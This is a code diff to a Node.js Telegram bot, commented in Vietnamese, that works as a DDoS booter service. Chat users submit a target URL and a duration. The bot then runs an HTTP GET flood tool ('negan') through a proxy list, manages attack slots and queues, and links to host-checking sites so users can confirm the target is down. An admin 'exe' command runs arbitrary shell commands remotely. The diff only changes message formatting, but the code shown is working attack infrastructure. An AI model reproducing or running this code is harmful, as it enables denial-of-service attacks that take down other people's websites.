@@ -20,11 +20,10 @@ console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.
 // Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
 const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
 
-// Hàm gửi thông báo dưới dạng JSON với định dạng đẹp
-const sendJsonMessage = async (chatId, data) => {
+// Hàm gửi thông báo dưới dạng HTML
+const sendHtmlMessage = async (chatId, message) => {
     try {
-        const formattedMessage = `<pre><code>${JSON.stringify(data, null, 2)}</code></pre>`;
-        await bot.sendMessage(chatId, formattedMessage, { parse_mode: 'HTML' });
+        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
     } catch (error) {
         console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
     }
@@ -33,31 +32,14 @@ const sendJsonMessage = async (chatId, data) => {
 // Hàm thực thi lệnh
 const executeCommand = async (chatId, command, host, time, username) => {
     const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
-    const startMessage = {
-        status: "🚀 <b>Thành công</b> 🚀",
-        pid: pid,
-        website: host,
-        time: `${time} Giây`,
-        caller: `@${username}`,
-        maxSlots: maxSlot,
-        startTime: startTime,
-        checkHost: `<a href="https://check-host.net/check-http?host=${host}">Kiểm tra Host</a>`,
-        hostTracker: `<a href="https://www.host-tracker.com/en/ic/check-http?url=${host}">Host Tracker</a>`
-    };
-    await sendJsonMessage(chatId, startMessage);
+    const startMessage = `<b>🚀 Thành công 🚀</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian bắt đầu: ${startTime}\nSố lượt tấn công có thể gọi đồng thời: ${maxSlot} slots\n[Kiểm tra Host](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})</pre>`;
+    await sendHtmlMessage(chatId, startMessage);
 
     const child = exec(command, { shell: '/bin/bash' });
     child.on('close', () => {
         const endTime = getVietnamTime();
-        const completeMessage = {
-            status: "✅ <b>Tiến trình hoàn tất</b>",
-            pid: pid,
-            website: host,
-            time: `${time} Giây`,
-            caller: `@${username}`,
-            endTime: endTime
-        };
-        sendJsonMessage(chatId, completeMessage);
+        const completeMessage = `<b>✅ Tiến trình hoàn tất</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian kết thúc: ${endTime}</pre>`;
+        sendHtmlMessage(chatId, completeMessage);
         currentAttacks.delete(chatId);
         if (attackQueue.length > 0) {
             const nextAttack = attackQueue.shift();
@@ -72,26 +54,26 @@ bot.on('message', async (msg) => {
     const username = msg.from.username || msg.from.first_name;
 
     // Kiểm tra quyền thực thi lệnh
-    if (!isAdmin && !isGroup) return sendJsonMessage(chatId, { error: "🚫 Bạn không có quyền thực hiện lệnh này." });
+    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '<b>🚫 Bạn không có quyền thực hiện lệnh này.</b>');
 
     // Xử lý lệnh tấn công (URL + thời gian)
     if (text.startsWith('http://') || text.startsWith('https://')) {
         const parts = text.split(' ');
-        if (parts.length !== 2 || isNaN(parts[1])) return sendJsonMessage(chatId, { error: "🚫 Sai định dạng! Nhập theo: <URL> <time>." });
+        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '<b>🚫 Sai định dạng! Nhập theo: &lt;URL&gt; &lt;time&gt;.</b>');
         const [host, time] = parts;
-        if (time > maxTimeAttacks) return sendJsonMessage(chatId, { error: `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.` });
+        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `<b>🚫 Thời gian tối đa là ${maxTimeAttacks} giây.</b>`);
 
         // Kiểm tra số lệnh đang chạy của người dùng
         const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
         if (userAttacks >= maxSlot) {
             const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
-            return sendJsonMessage(chatId, { error: `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.` });
+            return sendHtmlMessage(chatId, `<b>🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.</b>`);
         }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
         if (currentAttacks.size >= maxConcurrentAttacks) {
             attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
-            return sendJsonMessage(chatId, { status: "⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ..." });
+            return sendHtmlMessage(chatId, '<b>⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...</b>');
         }
 
         const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
@@ -103,15 +85,15 @@ bot.on('message', async (msg) => {
     // Xử lý lệnh exe (chỉ admin)
     if (text.startsWith('exe ') && isAdmin) {
         const command = text.slice(4).trim();
-        if (!command) return sendJsonMessage(chatId, { error: "🚫 Lệnh không được để trống. Ví dụ: exe ls" });
+        if (!command) return sendHtmlMessage(chatId, '<b>🚫 Lệnh không được để trống. Ví dụ: exe ls</b>');
         const child = exec(command, { shell: '/bin/bash' });
         let output = '';
         child.stdout.on('data', (data) => output += data.toString());
         child.stderr.on('data', (data) => output += data.toString());
-        child.on('close', () => sendJsonMessage(chatId, { status: "🚀 Kết quả lệnh", command, output }));
+        child.on('close', () => sendHtmlMessage(chatId, `<b>🚀 Kết quả lệnh:</b>\n<pre>${command}\n${output}</pre>`));
         return;
     }
 
     // Lệnh không hợp lệ
-    sendJsonMessage(chatId, { error: "🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với 'exe' hoặc nhập URL và thời gian." });
+    sendHtmlMessage(chatId, '<b>🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.</b>');
 });
